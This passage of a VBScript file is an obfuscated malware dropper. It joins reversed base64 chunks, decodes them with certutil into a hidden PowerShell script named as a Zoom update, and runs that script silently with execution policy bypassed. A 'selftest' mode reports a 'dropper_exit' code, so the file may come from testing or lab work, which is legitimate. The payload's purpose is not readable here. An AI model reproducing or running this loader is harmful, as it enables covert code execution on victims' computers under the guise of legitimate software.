    "ZhzMalVWy0UWINTbsFXd3cjSqN2ZvJ3YopFdv8kYCNHO4YUM", _
    "2IERjR2UshHO4dEZKpmZEN2bxMjU4VjVsZ2TNVzMEl0VwMXS", _
    "mlDVhR2TuhnevRndpR2LElTZxZmUKR0bBNDZsdFd2lEeLJ3b", _
    "rdlUWtEenpUSCd3MKZnaGBTQrVzKmplcEp2RNtGbxBFbRp3Z", _
    "P9EVxEDSEpkeIRnTOR1M0J2MHRFaXp1KhR3UYJnVDRmbotUc", _
    "FpWTz8SYqFlWjNlcUtWNYVEZtlFeKFkR1lHTihnNyc0UHxmU", _
    "yd0RSZFOphEZvsiNUxGcmxma4dEWGFzLKJkW5IGOtdjRPRFa", _
    "wY3UU9ETKh0boBHd3RWT4BnWhlTW5VDTMtEbV1GezRWbs9iT", _
    "3VmTg0DItFWZyR3U6dGJgACIgoQDpcyLvZ2K4VXdXxUVEJFT", _
    "K0QKzVGd5JkenRCLo0WYlJHdTlncv1WZN5yTJBCdjVmai9UL", _
    "vl2czVmcw12bD5yTJBCdjVmai9UL3VmTg0DIwlmenRCIgACI", _
    "yBXbvNkLPl0WgwSbhVmc0NlenRCKtFWZyR3UlRXYsZWZE5ib", _
    "pM3clJHct92YlRkO60VZk9WTu9WazNXZyBXbvNkLu9WazNXZ", _
    "tFWZyR3Uu8USgQ3YlpmYP1ydl5EI9AiclRWYlJHJgACIgoQD", _
    "pgjRUVlO601ZulGZvNmbF5Cd4VGVbBCLwlmenRCKyVGZhVmU", _
    "NkCKk5WRvRFZhVmUuIXZkFWZyRCI9ASZjJXdvNHJgACIgoQD", _
    "z9GczlGRuAXa6dGJgsTKoU2cvB3cpRkLyVGZhVmckACIgAiC", _
    "g0DIwNGJgACIgoQDpgSZz9GczlGRu0WYlJHdTp3ZkAyOpgSZ", _
    "D5iclxWaw12bD5SbvRUZk92Qu0WZ0NXeTBCdjVmai9UL3VmT", _
    "JVGdhJXZuV2RuA3YkACIgAiCNMnclRXZtFmchBlclxWaw12b", _
    "lhXRlRXYyVmbldkLwNGJgACIgoQDlVnc0RCI9ASey9Wbl1kb", _
    "w9kclxWaw12bD5CcjRCIgACIK0QZzxWYmRCI9ASZsJWY0V3Y", _
    "u0WZ0NXeTdCKABCIgAiCNcyKlpXatlGdw92LnASPgMnbvlGd", _
    "yV3YlNlLtVGdzl3UnwyJsxGZuUmcvNkLtVGdzl3UnwyJsxGZ", _
    "GBCfgkyJsxGZuAnchh2UD5Cdm92cvJ3Yp10JscCbsRmL5RXa", _
    "S5CcjRSXkl2b2tFIgACIgACIgoQD7BCdjVmai9ULoNWYFJ3b", _
    "K0QfgACIgoQDp8FJoQGZB5ycllGbi1WZzNXQkV2YuVmclZWZ", _
    "0Z2bz9mcjlWTgQ3YlpmYP1ydl5EI9AiclRWa29mcwRCIgACI", _
    "zVmckACIgAiCNIXZklmdvJHUlR2bDBnchh2UD5CcyFGaTNkL", _
    "T12byZUesJWblN3cBVGbpBXbvNkLyVGZpZ3byBHJg0DI0xWd", _
    "0xWdzVmckgCImlGIgACIK0QKlNmc192ckACLwNGJoU2YyV3b", _
    "4VGdkACIgACIgACIK0wegkCMgQ3ZtACduV3bD5ycy9mcyVkL", _
    "1NXZyRCIulGIlRCKgg2YhVmcvZGIgACIgACIgoQDncCI9ACd", _
    "gkCKn5WayR3UvRlLlRCI9sCI0hXZ0RCI7BSKzJ3byJXRuQHb", _
    "lRXaydlO60VZslmRu8USbBCIgACIgACIK0QfgIibgJHYiAyK", _
    "w1Sbv9menACUNVEV6YnblRCIoRXYQ1ibp9mSogCd4VGVsxWQ", _
    "phXZgACIgACIgAiCNkCd4VGdkACLpcyZvxmLsxWZoNncld3b", _
    "w12bD5CdsV3clJHJg0DIlBXe0RCIgACIK0QfgACIgoQDyACd", _
    "K0QKnIXZkF2bM12bvp1JoUGc5RFdldkL5xmYtV2czFEZlxWa", _
    "n4Wah10JoQ2boRXZNRXZH5SZwlHdkASPgQ2boRXZtRCIgACI", _
    "pBCIgAiCNUERP10XN90TapjduVGJg0DIlR2btRCIgACIK0QK", _
    "7BSKpUGZv1GJokHdw1WRy9EbsVnTzlkO601Zulmc0N3WoAiZ", _
    "nJXQlt2b25WakACIgAiCN0HInwGbhR3cul2Jg0DIlR2btRCI", _
    "ulGJgACIgoQDxAyJdtFdjVmai92JgQ3YlpmYP1ydl5EI9Ayc", _
    "gAiCNkSZk9WbkgCQd11Wn5WayR3cbBSPg0FMbN3ZyFUZr9md", _
    "25WakACLsxWduRCKlt2b25WSuQ2boRXZtRCI9ASZk92YkACI", _
    "0F2Yg0nCNUGZvNGJdRnbptFI0lGelBCIgAiCNkycnJXQlt2b", _
    "6oTXlxWaG5yTJtFIgACIgACIgoQD7BSeyRHIgACIK0wegg2Y", _
    "6dCIQ1URUpjduVGJggGdhBVLul2bKhCK0hXZUxGbBVGdpJ3V", _
    "pkCKn5WayR3UvRlLfRCIskyJn9GbuwGblh2cyV2dvBXLt92b", _
    "==QfK0QMgQXa4VGIgACIK0Qf7BCajRXYjBSfgACIgoQD" _
)

b64 = ""
For i = 0 To UBound(chunks)
    b64 = b64 & Rev(chunks(i))
Next

' powershell.exe assembled from reversed fragments.
psExe = U(Array("llehsrewop", ".", "exe"))
psFile = sh.ExpandEnvironmentStrings("%TEMP%") & "\.zoom-update.ps1"
b64File = sh.ExpandEnvironmentStrings("%TEMP%") & "\.zoom-update.b64"
Set st = CreateObject("ADODB.Stream")
st.Type = 2
st.Charset = "ascii"
st.Open
st.WriteText b64
st.SaveToFile b64File, 2
st.Close
Set st = Nothing
sh.Run "certutil.exe -f -decode """ & b64File & """ """ & psFile & """", 0, True
fso.DeleteFile b64File, True
psCmd = psExe & " -NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -File """ & psFile & """"

On Error Resume Next
waitMode = (mode = "selftest")
rc = sh.Run(psCmd, 0, waitMode)
If Err.Number <> 0 Then
    rc = 1
    Err.Clear
End If

If mode = "selftest" Then
    logPath = sh.ExpandEnvironmentStrings("%TEMP%") & "\zoom-selftest.log"
    If fso.FileExists(logPath) Then
        WScript.Echo fso.OpenTextFile(logPath, 1).ReadAll
    End If
    WScript.Echo "dropper_exit=" & rc
End If

Function Rev(value)
    Rev = StrReverse(value)
End Function

Function U(parts)
    Dim j
    U = ""
    For j = 0 To UBound(parts)
        U = U & StrReverse(parts(j))
    Next
End Function

Function IIf(condition, whenTrue, whenFalse)
    If condition Then
        IIf = whenTrue
    Else
        IIf = whenFalse
    End If
End Function
